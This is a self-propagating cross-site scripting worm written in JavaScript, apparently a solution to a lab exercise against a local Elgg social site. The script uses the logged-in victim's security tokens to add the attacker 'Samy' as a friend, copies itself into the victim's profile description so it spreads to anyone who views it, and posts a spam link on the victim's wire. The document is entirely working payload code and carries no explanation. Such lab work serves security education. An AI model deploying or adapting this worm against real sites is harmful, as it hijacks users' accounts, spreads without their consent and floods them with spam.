
<script id="worm" type="text/javascript">

	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.

		var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token + ts + token; //FILL IN

		//Create and send Ajax request to add friend
		if (elgg.get_logged_in_user_guid() !== 47) {
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();
		}
		
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		ts="__elgg_ts="+elgg.security.token.__elgg_ts;
		token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the content of your url.
		sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
		var content= ts + token + "&name=Alice&description=1605031" + wormCode+  "&accesslevel%5Bdescription%5D=1&briefdescription=1605031&accesslevel%5Bbriefdescription%5D=1&location=dhaka&accesslevel%5Blocation%5D=1&interests=music&accesslevel%5Binterests%5D=1&skills=vodox&accesslevel%5Bskills%5D=1&contactemail=email@email.com&accesslevel%5Bcontactemail%5D=1&phone=123456789&accesslevel%5Bphone%5D=1&mobile=123456789&accesslevel%5Bmobile%5D=1&website=www.tasinishmam.com&accesslevel%5Bwebsite%5D=1&twitter=ags3927&accesslevel%5Btwitter%5D=1&guid=" + elgg.get_logged_in_user_guid(); //FILL IN
	
		if(elgg.get_logged_in_user_guid() !== 47)
		{
			//Create and send Ajax request to modify profile
			Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}

		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		token="__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the content of your url.
		sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
		var body = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com/profile/samy"
		content= token + ts + "&body=" + body; //FILL IN
	
		if(elgg.get_logged_in_user_guid() !== 47)
		{
			//Create and send Ajax request to modify profile
			Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>
